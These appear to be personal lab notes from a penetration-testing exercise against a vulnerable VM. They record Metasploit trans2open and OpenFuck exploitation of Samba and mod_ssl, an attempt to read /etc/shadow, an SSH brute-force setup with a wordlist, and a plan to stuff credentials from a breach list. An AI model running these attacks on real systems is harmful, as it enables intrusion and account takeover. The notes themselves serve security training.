## Metasploit

- searchsploit samba 2.2
- 
    
    ![image.png](attachment:79f6ea95-55a9-4313-a449-f49f040e868f:image.png)
    
- msfconsole
- search trans2open
- 

![image.png](attachment:3b8addf1-dd9f-430a-89f5-d0512dbfb54a:image.png)

- 1st Try to exploit using this payload (Fail)

![image.png](attachment:2610b908-87b2-4a5e-9a66-f6dd58c4a3e2:image.png)

- 1st Try to exploit Fail Result

![image.png](attachment:8d3d4c94-5c9f-4168-aaf4-4d02cd8f9b5d:image.png)

- 2nd Try to exploit by list out the payloads available (set payload linux/x86/) click x2 TAB on keyboard.
- 

![image.png](attachment:fbc7ada3-d1c0-4dec-b10c-5079f218c7e9:image.png)

- 2nd Try to exploit using Non-Staged Payload (Success)

![image.png](attachment:f5964157-1367-4cde-bc25-c8918b58c65e:image.png)

- 2nd Try to exploit Success Result
- 

![image.png](attachment:a879a190-e6d5-4630-ae7c-01597f12eb40:image.png)

## Manual Exploitation

- Using OpenLuck from github
- ./OpenFuck
- 

![image.png](attachment:282f9322-86a8-4cfc-91fd-f98c11bb9e66:image.png)

- ./OpenFuck 0x6b 192.168.1.12 -c 40
- 

![image.png](attachment:6d6fc2fb-c6ce-49b3-a071-3483bbdddb47:image.png)

- 

![image.png](attachment:69bd48cc-850a-4a88-8b0a-4a181ca969d6:image.png)

- cat /etc/shadow: Permission denied

## Brute Force Attack on SSH

- use metasploit - search ssh
- use auxiliary/scanner/ssh/ssh_login
- set username root
- set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
- set rhosts 192.168.1.12
- set threads 10
- set verbose true
- true
- exploit
- 

![image.png](attachment:30fe0642-659d-4b0e-93c1-66926f6ecd80:image.png)

## Credential Stuffing and Password Spraying

- Use from Tesla Breach Parse List of Usernames and Passwords to include in the Burpsuite (Intruder)
